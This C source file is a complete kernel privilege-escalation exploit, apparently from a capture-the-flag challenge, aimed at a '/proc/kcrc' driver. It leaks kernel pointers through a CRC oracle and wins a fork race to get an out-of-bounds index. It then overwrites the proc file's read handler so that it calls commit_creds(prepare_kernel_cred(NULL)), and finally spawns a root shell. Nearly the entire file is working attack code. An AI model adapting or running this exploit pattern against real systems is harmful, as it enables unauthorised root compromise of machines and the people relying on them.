#define WEXITSTATUS(status) (((status) & 0xff00) >> 8)

#define HEX "0123456789abcdef"
void write_hex(int fd, int num) {
    for (int i = 7; i >= 0; i--)
    {
        write(fd, &HEX[(num >> (i * 4)) & 0xf], 1);
    }
}

#define LOG_HEX(num) write_hex(2, (int)(num))
#define LOG(str) write(2, (str), sizeof(str) - 1)

#define SEEK_SET 0

#define ADD 0xADD
#define DEL 0xDE1

#define KCRC_ADDR ((void *)%d)
#define PROCFILE_ADDR (KCRC_ADDR + 0x400)

typedef __attribute__((regparm(1))) void *(*prepare_kernel_cred_t)(void *);
typedef __attribute__((regparm(1))) int (*commit_creds_t)(void *);
#define prepare_kernel_cred ((prepare_kernel_cred_t)(%d))
#define commit_creds ((commit_creds_t)(%d))

typedef struct _command
{
    int op;
    char *ptr;
    int len;
} command_t;

int do_read(int fd, int *crc, int len)
{
    return read(fd, crc, len);
}

int do_write(int fd, int op, char *ptr, int len)
{
    command_t cmd = {.op = op, .ptr = ptr, .len = len};
    return write(fd, &cmd, sizeof(cmd));
}

int do_del(int fd)
{
    return do_write(fd, DEL, NULL, 0);
}

int do_add(int fd, char *ptr, int len)
{
    return do_write(fd, ADD, ptr, len);
}

int do_advance(int fd){
    return do_add(fd, NULL, 0);
}

void try_win_race(int fd)
{
    for (int i = 0; i < 256; i++)
    {
        do_advance(fd);
    }
    
    while (1)
    {
        int status;
        int ret1, ret2;
        int pid = fork();

        if (pid == 0){
            // child
            exit(do_advance(fd));
        } else {
            // parent
            ret1 = do_advance(fd);
        }

        waitpid(-1, &status, 0);

        ret2 = WEXITSTATUS(status);

        if (ret2 == 1 && ret1 == 1) {
            LOG("won race!\n");
            break;
        }

        do_del(fd);
    }
}

int _calc_crc(int fd, void *ptr, int len)
{
    int crc;
    do_add(fd, ptr, len);
    do_read(fd, &crc, sizeof crc);
    do_del(fd);
    lseek(fd, 0, SEEK_SET);

    return crc;
}

void *memcpy(void *dst, const void *src, unsigned int length)
{
    for (int i = 0; i < length; i++)
    {
        *(char *)(dst++) = *(char *)(src++);
    }

    return dst;
}

const int crcs[256] = {
    -771559539,
    -1526341861,
    1007455905,
    1259060791,
    -714134636,
    -1570235646,
    996231864,
    1281784366,
    -589731905,
    -1411492055,
    852952723,
    1171273221,
    -608918618,
    -1397517520,
    901431946,
    1119744540,
    -810156055,
    -1196241025,
    565944005,
    1455205971,
    -925352976,
    -1075901594,
    651582172,
    1372678730,
    -1049724965,
    -1234614451,
    794826487,
    1483155041,
    -972835902,
    -1325104300,
    671994606,
    1594548856,
    -378745019,
    -1637089325,
    123907689,
    1885708031,
    -301921444,
    -1727644726,
    1010288,
    1997036262,
    -407419017,
    -1867483167,
    163128923,
    2126386893,
    -522550418,
    -1747078152,
    248832578,
    2043925204,
    -186917087,
    -2082672713,
    450215437,
    1842515611,
    -206169288,
    -2068763730,
    498629140,
    1790921346,
    -100641005,
    -1928894587,
    336475711,
    1661535913,
    -43150582,
    -1972722788,
    325317158,
    1684325040,
    -1528910307,
    -740712821,
    1255198513,
    1037565863,
    -1548523004,
    -726377838,
    1304234792,
    985283518,
    -1442503121,
    -587065671,
    1141589763,
    856455061,
    -1385635274,
    -630205792,
    1130791706,
    878818188,
    -1184252295,
    -831615249,
    1466425173,
    543223747,
    -1107002784,
    -922531082,
    1342839628,
    655174618,
    -1213057461,
    -1061878051,
    1505515367,
    784033777,
    -1327500718,
    -942095676,
    1590793086,
    701932520,
    -1615819051,
    -390611389,
    1908338681,
    112844655,
    -1730327860,
    -270894502,
    1993550816,
    30677878,
    -1855256857,
    -429115791,
    2137352139,
    140662621,
    -1777941762,
    -519966104,
    2013832146,
    252678980,
    -2113429839,
    -184504793,
    1812594589,
    453955339,
    -2056627544,
    -227710402,
    1801730948,
    476252946,
    -1931733373,
    -69523947,
    1657960367,
    366298937,
    -1951280486,
    -55123444,
    1707062198,
    314082080,
    1069182125,
    1220369467,
    -776729215,
    -1498202857,
    953657524,
    1339070498,
    -690370152,
    -1579222770,
    828499103,
    1181144073,
    -546339405,
    -1469532891,
    906764422,
    1091244048,
    -670940758,
    -1358597828,
    571309257,
    1426738271,
    -872210971,
    -1157354125,
    627095760,
    1382516806,
    -881927684,
    -1133909654,
    752284923,
    1540473965,
    -1025993257,
    -1243634367,
    733688034,
    1555824756,
    -977972786,
    -1296932520,
    81022053,
    1943239923,
    -354800311,
    -1646453281,
    62490748,
    1958656234,
    -306714288,
    -1699685946,
    168805463,
    2097738945,
    -469654149,
    -1828284947,
    224526414,
    2053451992,
    -479436446,
    -1804905996,
    425942017,
    1852075159,
    -143835859,
    -2140533317,
    504272920,
    1762240654,
    -268371660,
    -2029532766,
    397988915,
    1623188645,
    -105466593,
    -1900968567,
    282398762,
    1741824188,
    -19173114,
    -1982054000,
    1231433021,
    1046551979,
    -1486337007,
    -797999993,
    1309403428,
    957143474,
    -1610250232,
    -687687522,
    1203610895,
    817534361,
    -1447836637,
    -558566219,
    1087398166,
    936857984,
    -1361182662,
    -640077652,
    1422998873,
    601230799,
    -1159766923,
    -841454365,
    1404893504,
    616286678,
    -1112369044,
    -894064390,
    1510651243,
    755860989,
    -1274751929,
    -1023154991,
    1567060338,
    710951396,
    -1284960162,
    -999415608,
    1913130485,
    84884835,
    -1677300519,
    -352232369,
    1969605100,
    40040826,
    -1687443264,
    -328427434,
    2094237127,
    198489425,
    -1830951701,
    -438643587,
    2076066270,
    213479752,
    -1783619342,
    -491319196,
    1874795921,
    414723335,
    -2119074627,
    -155825109,
    1758648712,
    534112542,
    -2032355164,
    -237270990,
    1633981859,
    375629109,
    -1888815985,
    -127024103,
    1711886778,
    286155052,
    -2012794730,
    -16777216,
};
int match_crc(int crc, char *c)
{
    for (int i = 0; i < 256; i++)
    {
        if (crcs[i] == crc)
        {
            *c = i;
            return 0;
        }
    }
    return 1;
}

int leak_data(int fd, void *ptr, int len, char *data)
{
    for (int i = 0; i < len; i++)
    {
        int crc = _calc_crc(fd, ptr + i, 1);
        match_crc(crc, &data[i]);
    }

    return 0;
}

int privileged() {
    // get root
    LOG("running in kernel yay!\n");
    LOG("getting root!\n");
    commit_creds(prepare_kernel_cred(NULL));
    return 0;
}



int main()
{
    int fd = open("/proc/kcrc", O_RDWR, 0);
    if (fd < 0)
    {
        LOG("error opening file!\n");
        exit(1);
    }

    // move to the start of buffer (reset if previous attempts failed)
    for (int i = 0; i < 256; i++)
    {
        do_del(fd);
    }

    // leak procfile address
    void *procfile;

    leak_data(fd, PROCFILE_ADDR, sizeof(procfile), (char *)&procfile);

    LOG("leaked proc file ptr: 0x");
    LOG_HEX(procfile);
    LOG("\n");

    // vulnerability: race two threads to increment the index OOB twice
    try_win_race(fd);

    // overwrite index to point to procfile struct
    LOG("overwriting index to point to 0x");
    LOG_HEX(procfile);
    LOG("\n");

    char reverese_crc[8];
    read(0, reverese_crc, sizeof(reverese_crc));  // backend breaks the crc and sends us

    do_add(fd, reverese_crc, 6);  // without CRLF

    // overwrite read procedure -> privileged
    LOG("privileged: 0x");
    LOG_HEX(privileged);
    LOG("\n");

    read(0, reverese_crc, 8);  // backend breaks the crc and sends us
    
    LOG("overwriting read procedure\n");

    do_add(fd, reverese_crc, 6);  // without CRLF

    // trigger privileged() (sets uid=0)
    LOG("jumping...\n");

    int tmp;
    do_read(fd, &tmp, sizeof(tmp));

    // spawn shell
    LOG("spawning shell\n");
    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, (char *[]){NULL});

    exit(0);
}